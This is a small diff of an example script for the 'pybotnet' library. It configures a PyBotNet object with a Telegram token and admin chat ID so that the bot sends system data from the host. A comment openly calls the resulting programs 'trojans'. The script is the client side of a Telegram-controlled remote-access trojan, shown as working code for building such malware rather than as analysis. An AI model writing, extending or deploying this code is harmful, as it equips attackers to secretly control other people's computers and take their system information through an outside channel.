@@ -5,13 +5,12 @@ import time
 # ! rename configs.py.sample to configs.py
 # ! and edit configs.py data
 from configs import TELEGRAM_TOKEN, ADMIN_CHAT_ID
-
-# * if you compile code without shell (--noconsole in pyinstaller): is_shell=False
+# is_shell has already been removed since version 1.0.0 , please consider updating if your trojans made by pybotnet still have this.
 # * show_log: just for debugging
 # * send_system_data: send system short info in bot messages
 
 bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
-                        show_log=True, send_system_data=True, is_shell=True)
+                        show_log=True, send_system_data=True)
 
 delay = 10
 
